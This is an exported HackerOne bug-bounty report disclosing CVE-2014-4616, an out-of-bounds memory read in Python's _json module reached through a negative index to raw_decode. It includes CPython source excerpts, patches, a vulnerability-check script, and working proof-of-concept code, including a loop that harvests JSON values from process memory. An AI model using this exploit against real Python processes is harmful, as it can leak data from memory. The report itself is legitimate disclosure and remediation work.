{"id":12297,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjI5Nw==","url":"https://hackerone.com/reports/12297","title":"Python vulnerability: reading arbitrary process memory","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-05-16T23:14:13.564Z","submitted_at":"2014-05-16T23:14:13.564Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"guido","url":"/guido","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27,"url":"https://hackerone.com/ibb-python","handle":"ibb-python","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Python (IBB)","twitter_handle":"","website":"http://www.python.org/news/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2014-4616"],"singular_disclosure_disabled":false,"disclosed_at":"2014-06-20T05:54:36.382Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Python 2 and 3 are susceptible to arbitrary process memory reading by a user or adversary due to a bug in the _json module caused by insufficient bounds checking.\n\nThe sole prerequisites of this attack are that the attacker is able to control or influence the two parameters of the default scanstring function: the string to be decoded and the index.\n\nThe bug is caused by allowing the user to supply a negative index value. The index value is then used directly as an index to an array in the C code; internally the address of the array and its index are added to each other in order to yield the address of the value that is desired. However, by supplying a negative index value and adding this to the address of the array, the processor's register value wraps around and the calculated value will point to a position in memory which isn't within the bounds of the supplied string, causing the function to access other parts of the process memory.\n\nLet me clarify:\n\nThis is Python-3.4.0/Modules/_json.c:\n\n```\n1035 static PyObject *\n1036 scanner_call(PyObject *self, PyObject *args, PyObject *kwds)\n1037 {\n1038     /* Python callable interface to scan_once_{str,unicode} */\n1039     PyObject *pystr;\n1040     PyObject *rval;\n1041     Py_ssize_t idx;\n1042     Py_ssize_t next_idx = -1;\n1043     static char *kwlist[] = {\"string\", \"idx\", NULL};\n1044     PyScannerObject *s;\n1045     assert(PyScanner_Check(self));\n1046     s = (PyScannerObject *)self;\n1047     if (!PyArg_ParseTupleAndKeywords(args, kwds, \"On:scan_once\", kwlist, \u0026pystr, \u0026idx))\n1048         return NULL;\n1049\n1050     if (PyUnicode_Check(pystr)) {\n1051         rval = scan_once_unicode(s, pystr, idx, \u0026next_idx);\n1052     }\n1053     else {\n1054         PyErr_Format(PyExc_TypeError,\n1055                  \"first argument must be a string, not %.80s\",\n1056                  Py_TYPE(pystr)-\u003etp_name);\n1057         return NULL;\n1058     }\n1059     PyDict_Clear(s-\u003ememo);\n1060     if (rval == NULL)\n1061         return NULL;\n1062     return _build_rval_index_tuple(rval, next_idx);\n1063 }\n```\n\nAs you can see on line 1047, ParseTuple takes an 'n' as an argument for 'end', which, as can be learned from this page ( https://docs.python.org/3/c-api/arg.html ), means:\n\n```\n        n (int) [Py_ssize_t]\n            Convert a Python integer to a C Py_ssize_t.\n```\n\nThis means it accepts a SIGNED integer value, thus allowing a negative value to be supplied as the 'end' parameter.\n\nThen onto scanstring_unicode_once to which execution gets transferred through line 1051 of the code above.\n\n```\n922  static PyObject *\n923  scan_once_unicode(PyScannerObject *s, PyObject *pystr, Py_ssize_t\nidx, Py_ssize_t *next_idx_ptr)\n924  {\n925      /* Read one JSON term (of any kind) from PyUnicode pystr.\n926      idx is the index of the first character of the term\n927      *next_idx_ptr is a return-by-reference index to the first character after\n928          the number.\n929\n930      Returns a new PyObject representation of the term.\n931      */\n932      PyObject *res;\n933      void *str;\n934      int kind;\n935      Py_ssize_t length;\n936\n937      if (PyUnicode_READY(pystr) == -1)\n938          return NULL;\n939\n940      str = PyUnicode_DATA(pystr);\n941      kind = PyUnicode_KIND(pystr);\n942      length = PyUnicode_GET_LENGTH(pystr);\n943\n944      if (idx \u003e= length) {\n945          raise_stop_iteration(idx);\n946          return NULL;\n947      }\n```\n\nHere we see that 'length' is set to the length of the string parameter. This will always be a positive value. On line 945 it is checked whether idx is equal or higher than length; this can never be true in the case of a negative index value.\n\n```\n949      switch (PyUnicode_READ(kind, str, idx)) {\n```\n\nPyUnicode_READ is defined as follows ( in Python-3.4.0/Include/unicodeobject.h ):\n\n```\n516  /* Read a code point from the string's canonical representation.  No checks\n517     or ready calls are performed. */\n518  #define PyUnicode_READ(kind, data, index) \\\n519      ((Py_UCS4) \\\n520      ((kind) == PyUnicode_1BYTE_KIND ? \\\n521          ((const Py_UCS1 *)(data))[(index)] : \\\n522          ((kind) == PyUnicode_2BYTE_KIND ? \\\n523              ((const Py_UCS2 *)(data))[(index)] : \\\n524              ((const Py_UCS4 *)(data))[(index)] \\\n525          ) \\\n526      ))\n```\n\nHere we can see that index, which is negative in our example, is used as an array index. Since it is negative, it will internally wrap around and point to an address BELOW the address of 'data'.\n\nSo, if a certain negative value (such as -0x7FFFFFFF) is supplied and data[index] will effectively point to an invalid or read-protected page in memory, the Python executable will segfault.\n\nBut there's more. Instead of making it point to an invalid page, let's make it point to something valid:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \"99448866\"\n4    b = \"88445522\"\n5    diff = id(a) - id(b)\n6    print(\"Difference is \" + hex(diff))\n7    print j.raw_decode(b)\n8    print j.raw_decode(b, diff)\n```\n\nOutput of this script is:\n\nDifference is -0x30\n(88445522, 8)\n(99448866, -40)\n\nThe difference between the address of 'a' and the address of 'b' is calculated and supplied as an index to the raw_decode function.\nInternally the address wraps around and we get to see the contents of 'a' while having supplied 'b' as a parameter.\n\nWe can use this harvester to scan memory for valid JSON strings:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \"x\" * 1000\n4    for x in range(0, 600000):\n5        try:\n6            print j.raw_decode(a, 0 - x)\n7        except:\n8            pass\n```\n\nThere is one drawback, however. We cannot decode strings in this manner because:\n\n```\n296  static PyObject *\n297  scanstring_unicode(PyObject *pystr, Py_ssize_t end, int strict, Py_ssize_t *next_end_ptr)\n298  {\n299      /* Read the JSON string from PyUnicode pystr.\n300      end is the index of the first character after the quote.\n301      if strict is zero then literal control characters are allowed\n302      *next_end_ptr is a return-by-reference index of the character\n303          after the end quote\n304\n305      Return value is a new PyUnicode\n306      */\n307      PyObject *rval = NULL;\n308      Py_ssize_t len;\n309      Py_ssize_t begin = end - 1;\n310      Py_ssize_t next /* = begin */;\n311      const void *buf;\n312      int kind;\n313      PyObject *chunks = NULL;\n314      PyObject *chunk = NULL;\n315\n316      if (PyUnicode_READY(pystr) == -1)\n317          return 0;\n318\n319      len = PyUnicode_GET_LENGTH(pystr);\n320      buf = PyUnicode_DATA(pystr);\n321      kind = PyUnicode_KIND(pystr);\n322\n323      if (end \u003c 0 || len \u003c end) {\n324          PyErr_SetString(PyExc_ValueError, \"end is out of bounds\");\n325          goto bail;\n```\n\nthis code actually performs a bounds check by asserting that end (which is our index) isn't negative.\n\nHowever, I succesfully ran harvesting tests that could extract JSON-encoded arrays of numerical values (such as [10, 20, 40, 70] ) from the process memory without any problem or difficulty.\n\nGiven the ubiquity of JSON parsing in Python applications and the limited amount of prequisites and conditions under which this bug can be exploited, it is evident that this issue could have serious security implications in some cases.\n\nHere is a patch for 3.4.0:\n\n```\n--- _json_old.c    2014-04-12 17:47:08.749012372 +0200\n+++ _json.c    2014-04-12 17:44:52.253011645 +0200\n@@ -941,7 +941,7 @@\n     kind = PyUnicode_KIND(pystr);\n     length = PyUnicode_GET_LENGTH(pystr);\n\n-    if (idx \u003e= length) {\n+    if ( idx \u003c 0 || idx \u003e= length) {\n         raise_stop_iteration(idx);\n         return NULL;\n     }\n```\n\nAnd here is a patch for 2.7.6:\n\n```\n--- _json_old.c    2014-04-12 17:57:14.365015601 +0200\n+++ _json.c    2014-04-12 18:04:25.149017898 +0200\n@@ -1491,7 +1491,7 @@\n     PyObject *res;\n     char *str = PyString_AS_STRING(pystr);\n     Py_ssize_t length = PyString_GET_SIZE(pystr);\n-    if (idx \u003e= length) {\n+    if ( idx \u003c 0 || idx \u003e= length) {\n         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n@@ -1578,7 +1578,7 @@\n     PyObject *res;\n     Py_UNICODE *str = PyUnicode_AS_UNICODE(pystr);\n     Py_ssize_t length = PyUnicode_GET_SIZE(pystr);\n-    if (idx \u003e= length) {\n+    if ( idx \u003c 0 || idx \u003e= length) {\n         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n```\n\n\nHere is a script that checks whether the Python binary that executes it is vulnerable:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3\n4    a = '128931233'\n5    b = \"472389423\"\n6\n7    if id(a) \u003c id(b):\n8        x = a\n9        y = b\n10   else:\n11       x = b\n12       y = a\n13\n14   diff = id(x) - id(y)\n15\n16   try:\n17       j.raw_decode(y, diff)\n18       print(\"Vulnerable\")\n19   except:\n20       print(\"Not vulnerable\")\n```\n","vulnerability_information_html":"\u003cp\u003ePython 2 and 3 are susceptible to arbitrary process memory reading by a user or adversary due to a bug in the _json module caused by insufficient bounds checking.\u003c/p\u003e\n\n\u003cp\u003eThe sole prerequisites of this attack are that the attacker is able to control or influence the two parameters of the default scanstring function: the string to be decoded and the index.\u003c/p\u003e\n\n\u003cp\u003eThe bug is caused by allowing the user to supply a negative index value. The index value is then used directly as an index to an array in the C code; internally the address of the array and its index are added to each other in order to yield the address of the value that is desired. However, by supplying a negative index value and adding this to the address of the array, the processor\u0026#39;s register value wraps around and the calculated value will point to a position in memory which isn\u0026#39;t within the bounds of the supplied string, causing the function to access other parts of the process memory.\u003c/p\u003e\n\n\u003cp\u003eLet me clarify:\u003c/p\u003e\n\n\u003cp\u003eThis is Python-3.4.0/Modules/_json.c:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1035 static PyObject *\n1036 scanner_call(PyObject *self, PyObject *args, PyObject *kwds)\n1037 {\n1038     /* Python callable interface to scan_once_{str,unicode} */\n1039     PyObject *pystr;\n1040     PyObject *rval;\n1041     Py_ssize_t idx;\n1042     Py_ssize_t next_idx = -1;\n1043     static char *kwlist[] = {\u0026quot;string\u0026quot;, \u0026quot;idx\u0026quot;, NULL};\n1044     PyScannerObject *s;\n1045     assert(PyScanner_Check(self));\n1046     s = (PyScannerObject *)self;\n1047     if (!PyArg_ParseTupleAndKeywords(args, kwds, \u0026quot;On:scan_once\u0026quot;, kwlist, \u0026amp;pystr, \u0026amp;idx))\n1048         return NULL;\n1049\n1050     if (PyUnicode_Check(pystr)) {\n1051         rval = scan_once_unicode(s, pystr, idx, \u0026amp;next_idx);\n1052     }\n1053     else {\n1054         PyErr_Format(PyExc_TypeError,\n1055                  \u0026quot;first argument must be a string, not %.80s\u0026quot;,\n1056                  Py_TYPE(pystr)-\u0026gt;tp_name);\n1057         return NULL;\n1058     }\n1059     PyDict_Clear(s-\u0026gt;memo);\n1060     if (rval == NULL)\n1061         return NULL;\n1062     return _build_rval_index_tuple(rval, next_idx);\n1063 }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see on line 1047, ParseTuple takes an \u0026#39;n\u0026#39; as an argument for \u0026#39;end\u0026#39;, which, as can be learned from this page ( \u003ca title=\"https://docs.python.org/3/c-api/arg.html\" href=\"/redirect?url=https%3A%2F%2Fdocs.python.org%2F3%2Fc-api%2Farg.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.python.org/3/c-api/arg.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ), means:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        n (int) [Py_ssize_t]\n            Convert a Python integer to a C Py_ssize_t.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis means it accepts a SIGNED integer value, thus allowing a negative value to be supplied as the \u0026#39;end\u0026#39; parameter.\u003c/p\u003e\n\n\u003cp\u003eThen onto scanstring_unicode_once to which execution gets transferred through line 1051 of the code above.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e922  static PyObject *\n923  scan_once_unicode(PyScannerObject *s, PyObject *pystr, Py_ssize_t\nidx, Py_ssize_t *next_idx_ptr)\n924  {\n925      /* Read one JSON term (of any kind) from PyUnicode pystr.\n926      idx is the index of the first character of the term\n927      *next_idx_ptr is a return-by-reference index to the first character after\n928          the number.\n929\n930      Returns a new PyObject representation of the term.\n931      */\n932      PyObject *res;\n933      void *str;\n934      int kind;\n935      Py_ssize_t length;\n936\n937      if (PyUnicode_READY(pystr) == -1)\n938          return NULL;\n939\n940      str = PyUnicode_DATA(pystr);\n941      kind = PyUnicode_KIND(pystr);\n942      length = PyUnicode_GET_LENGTH(pystr);\n943\n944      if (idx \u0026gt;= length) {\n945          raise_stop_iteration(idx);\n946          return NULL;\n947      }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere we see that \u0026#39;length\u0026#39; is set to the length of the string parameter. This will always be a positive value. On line 945 it is checked whether idx is equal or higher than length; this can never be true in the case of a negative index value.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e949      switch (PyUnicode_READ(kind, str, idx)) {\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePyUnicode_READ is defined as follows ( in Python-3.4.0/Include/unicodeobject.h ):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e516  /* Read a code point from the string\u0026#39;s canonical representation.  No checks\n517     or ready calls are performed. */\n518  #define PyUnicode_READ(kind, data, index) \\\n519      ((Py_UCS4) \\\n520      ((kind) == PyUnicode_1BYTE_KIND ? \\\n521          ((const Py_UCS1 *)(data))[(index)] : \\\n522          ((kind) == PyUnicode_2BYTE_KIND ? \\\n523              ((const Py_UCS2 *)(data))[(index)] : \\\n524              ((const Py_UCS4 *)(data))[(index)] \\\n525          ) \\\n526      ))\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere we can see that index, which is negative in our example, is used as an array index. Since it is negative, it will internally wrap around and point to an address BELOW the address of \u0026#39;data\u0026#39;.\u003c/p\u003e\n\n\u003cp\u003eSo, if a certain negative value (such as -0x7FFFFFFF) is supplied and data[index] will effectively point to an invalid or read-protected page in memory, the Python executable will segfault.\u003c/p\u003e\n\n\u003cp\u003eBut there\u0026#39;s more. Instead of making it point to an invalid page, let\u0026#39;s make it point to something valid:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \u0026quot;99448866\u0026quot;\n4    b = \u0026quot;88445522\u0026quot;\n5    diff = id(a) - id(b)\n6    print(\u0026quot;Difference is \u0026quot; + hex(diff))\n7    print j.raw_decode(b)\n8    print j.raw_decode(b, diff)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOutput of this script is:\u003c/p\u003e\n\n\u003cp\u003eDifference is -0x30\u003cbr\u003e\n(88445522, 8)\u003cbr\u003e\n(99448866, -40)\u003c/p\u003e\n\n\u003cp\u003eThe difference between the address of \u0026#39;a\u0026#39; and the address of \u0026#39;b\u0026#39; is calculated and supplied as an index to the raw_decode function.\u003cbr\u003e\nInternally the address wraps around and we get to see the contents of \u0026#39;a\u0026#39; while having supplied \u0026#39;b\u0026#39; as a parameter.\u003c/p\u003e\n\n\u003cp\u003eWe can use this harvester to scan memory for valid JSON strings:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \u0026quot;x\u0026quot; * 1000\n4    for x in range(0, 600000):\n5        try:\n6            print j.raw_decode(a, 0 - x)\n7        except:\n8            pass\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is one drawback, however. We cannot decode strings in this manner because:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e296  static PyObject *\n297  scanstring_unicode(PyObject *pystr, Py_ssize_t end, int strict, Py_ssize_t *next_end_ptr)\n298  {\n299      /* Read the JSON string from PyUnicode pystr.\n300      end is the index of the first character after the quote.\n301      if strict is zero then literal control characters are allowed\n302      *next_end_ptr is a return-by-reference index of the character\n303          after the end quote\n304\n305      Return value is a new PyUnicode\n306      */\n307      PyObject *rval = NULL;\n308      Py_ssize_t len;\n309      Py_ssize_t begin = end - 1;\n310      Py_ssize_t next /* = begin */;\n311      const void *buf;\n312      int kind;\n313      PyObject *chunks = NULL;\n314      PyObject *chunk = NULL;\n315\n316      if (PyUnicode_READY(pystr) == -1)\n317          return 0;\n318\n319      len = PyUnicode_GET_LENGTH(pystr);\n320      buf = PyUnicode_DATA(pystr);\n321      kind = PyUnicode_KIND(pystr);\n322\n323      if (end \u0026lt; 0 || len \u0026lt; end) {\n324          PyErr_SetString(PyExc_ValueError, \u0026quot;end is out of bounds\u0026quot;);\n325          goto bail;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethis code actually performs a bounds check by asserting that end (which is our index) isn\u0026#39;t negative.\u003c/p\u003e\n\n\u003cp\u003eHowever, I succesfully ran harvesting tests that could extract JSON-encoded arrays of numerical values (such as [10, 20, 40, 70] ) from the process memory without any problem or difficulty.\u003c/p\u003e\n\n\u003cp\u003eGiven the ubiquity of JSON parsing in Python applications and the limited amount of prequisites and conditions under which this bug can be exploited, it is evident that this issue could have serious security implications in some cases.\u003c/p\u003e\n\n\u003cp\u003eHere is a patch for 3.4.0:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e--- _json_old.c    2014-04-12 17:47:08.749012372 +0200\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ _json.c    2014-04-12 17:44:52.253011645 +0200\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -941,7 +941,7 @@\u003c/span\u003e\n     kind = PyUnicode_KIND(pystr);\n     length = PyUnicode_GET_LENGTH(pystr);\n\n-    if (idx \u0026gt;= length) {\n\u003cspan class=\"gi\"\u003e+    if ( idx \u0026lt; 0 || idx \u0026gt;= length) {\n\u003c/span\u003e         raise_stop_iteration(idx);\n         return NULL;\n     }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd here is a patch for 2.7.6:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e--- _json_old.c    2014-04-12 17:57:14.365015601 +0200\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ _json.c    2014-04-12 18:04:25.149017898 +0200\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1491,7 +1491,7 @@\u003c/span\u003e\n     PyObject *res;\n     char *str = PyString_AS_STRING(pystr);\n     Py_ssize_t length = PyString_GET_SIZE(pystr);\n\u003cspan class=\"gd\"\u003e-    if (idx \u0026gt;= length) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    if ( idx \u0026lt; 0 || idx \u0026gt;= length) {\n\u003c/span\u003e         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n\u003cspan class=\"p\"\u003e@@ -1578,7 +1578,7 @@\u003c/span\u003e\n     PyObject *res;\n     Py_UNICODE *str = PyUnicode_AS_UNICODE(pystr);\n     Py_ssize_t length = PyUnicode_GET_SIZE(pystr);\n\u003cspan class=\"gd\"\u003e-    if (idx \u0026gt;= length) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    if ( idx \u0026lt; 0 || idx \u0026gt;= length) {\n\u003c/span\u003e         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere is a script that checks whether the Python binary that executes it is vulnerable:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1    from json import JSONDecoder\n2    j = JSONDecoder()\n3\n4    a = \u0026#39;128931233\u0026#39;\n5    b = \u0026quot;472389423\u0026quot;\n6\n7    if id(a) \u0026lt; id(b):\n8        x = a\n9        y = b\n10   else:\n11       x = b\n12       y = a\n13\n14   diff = id(x) - id(y)\n15\n16   try:\n17       j.raw_decode(y, diff)\n18       print(\u0026quot;Vulnerable\u0026quot;)\n19   except:\n20       print(\u0026quot;Not vulnerable\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"1500.0","formatted_bounty":"$1,500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":76239,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"http://hg.python.org/cpython/rev/8130b8c06606","markdown_message":"\u003cp\u003e\u003ca title=\"http://hg.python.org/cpython/rev/8130b8c06606\" href=\"/redirect?url=http%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2F8130b8c06606\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://hg.python.org/cpython/rev/8130b8c06606\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-14T02:10:38.000Z","updated_at":"2014-04-14T02:10:38.000Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"guido","url":"/guido"},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":52727,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-16T23:14:13.668Z","updated_at":"2014-05-16T23:14:13.668Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-python","collaborator":{"username":"guido","url":"/guido"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}